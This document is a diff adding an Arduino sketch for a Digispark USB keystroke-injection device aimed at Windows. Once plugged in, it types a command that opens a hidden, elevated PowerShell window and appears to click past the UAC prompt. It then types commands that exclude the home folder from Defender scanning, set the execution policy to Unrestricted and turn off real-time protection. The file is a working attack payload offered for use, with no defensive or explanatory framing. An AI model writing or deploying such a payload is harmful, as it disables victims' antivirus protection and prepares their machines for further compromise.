@@ -1,0 +1,31 @@
+#include "DigiKeyboard.h"
+void setup() {
+  pinMode(1, OUTPUT); //LED on Model A 
+}
+void loop() {
+  DigiKeyboard.update();
+  DigiKeyboard.sendKeyStroke(0);
+  DigiKeyboard.delay(3000);
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
+  DigiKeyboard.delay(1500);
+  DigiKeyboard.println(F("powershell -windowstyle hidden -command Start-Process powershell -Verb RunAs")); 
+  DigiKeyboard.delay(1500);
+  DigiKeyboard.sendKeyStroke(KEY_LEFT_ARROW); 
+  DigiKeyboard.delay(1500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.delay(1500);  
+  DigiKeyboard.print(F("Set-MpPreference -ExclusionPath $HOME; Set-ExecutionPolicy Unrestricted -Scope CurrentUser; Set-MpPreference -DisableRealtimeMonitoring $true"));
+  DigiKeyboard.delay(1500);   
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  DigiKeyboard.sendKeyStroke(4);
+  DigiKeyboard.delay(1500);
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  
+
+  
+  
+  digitalWrite(1, HIGH); //turn on led when program finishes
+  DigiKeyboard.delay(90000);
+  digitalWrite(1, LOW); 
+  DigiKeyboard.delay(5000);
+}
